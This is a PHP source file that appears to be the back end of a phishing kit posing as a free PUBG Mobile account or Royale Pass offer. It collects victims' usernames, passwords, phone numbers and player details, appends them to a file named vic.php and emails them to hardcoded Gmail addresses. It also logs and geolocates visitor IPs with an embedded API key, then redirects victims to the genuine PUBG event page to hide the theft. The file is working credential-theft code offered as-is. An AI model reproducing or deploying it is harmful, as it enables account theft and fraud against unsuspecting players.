<?php
 $ip = $_SERVER['REMOTE_ADDR']; 
 $api_key = "acc6551c01c6e1870a7832c5314eb49f";
 $freegeoipjson = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."");
 $jsondata = json_decode($freegeoipjson);
 ?>
<?php


$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('admin/VisitorsIP.log', $line . PHP_EOL, FILE_APPEND);
$url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$emailserver ="cybreworm@gmail.com";
$key = $emailserver;
?>

<?php
$username = $_GET['username'];
$password = $_GET['password'];
$nope = $_GET['nope'];
$login = $_GET['login'];
$playid = $_GET['playid'];
$level = $_GET['level'];
$tier = $_GET['tier'];
$rpt = $_GET['rpt'];
$rpl = $_GET['rpl'];
$platform = $_GET['platform'];




$subjek = "PUBG $login|$username|$level";
$body = '

AKUN GRATIS

• Username   =   '.$username.'
• Password   =   '.$password.'
• PhoneNum   =   '.$nope.'

• PlayerID   =   '.$playid.'
• Tier       =   '.$tier.'
• Rp Type    =   '.$rpt.'

• AccLevel   =   '.$level.'
• RP Level   =   '.$rpl.'

• Platform   =   '.$platform.'

SELAMAT MENIKMATI
';


	$file = fopen("admin/vic.php", "a");
	fwrite($file, $body);

include ('admin/config.php');
$headers = "From:CHANEL ARIF CHEAT GAME <affandiarif8@gmail.com>";
$headers.= "";
$datamail = mail($key, $subjek, $body, $headers);
$success = mail($result, $subjek, $body, $headers);

echo "<script type='text/javascript'>window.top.location='https://www.pubgmobile.com/en/event/royalepass13';</script>";
?>